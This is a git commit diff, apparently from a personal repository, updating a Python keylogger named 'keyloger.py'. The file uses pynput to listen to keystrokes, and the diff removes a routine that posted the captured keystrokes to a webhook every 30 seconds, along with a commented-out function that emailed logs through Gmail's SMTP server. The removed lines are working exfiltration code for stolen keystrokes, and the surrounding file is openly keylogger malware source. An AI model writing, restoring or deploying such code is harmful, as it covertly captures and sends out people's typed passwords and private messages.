7813ee5d6d66820664950958909e22b467dd9e89
Dogukandercan <118507362+Dogukandercan@users.noreply.github.com>
2024-07-10 19:17:28 +0300

    Update keyloger.py

--- keyloger.py
+++ keyloger.py
@@ -4,7 +4,6 @@ import threading
 import requests
 import json
 
-webhook_url = "url"
 
 thw_word = ""
 
@@ -23,34 +22,8 @@ def callback_function(key):
 
 
 """
-def send_email(email,password,message):
-    email_server = smtplib.SMTP("smtp.gmail.com",587)
-    email_server.starttls()
-    email_server.login(email,password)
-    email_server.sendmail(email,email,message)
-    email_server.quit()
-
-#thread - threading
 """
 
-
-def send_webhook_message(log):
-    headers = {"Content-Type": "application/json"}
-    payload = {"content": log}
-    response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
-
-    if response.status_code == 204:
-        print("Mesaj başarıyla gönderildi.")
-    else:
-        print("Mesaj gönderimi sırasında bir hata oluştu. Hata kodu: " + str(response.status_code))
-
-def thread_function():
-    global thw_word
-    #send_email("user@gmail.com", "password", log.encode('utf-8'))
-    send_webhook_message(thw_word)
-    thw_word = ""
-    timer_object = threading.Timer(30,thread_function)
-    timer_object.start()
 
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
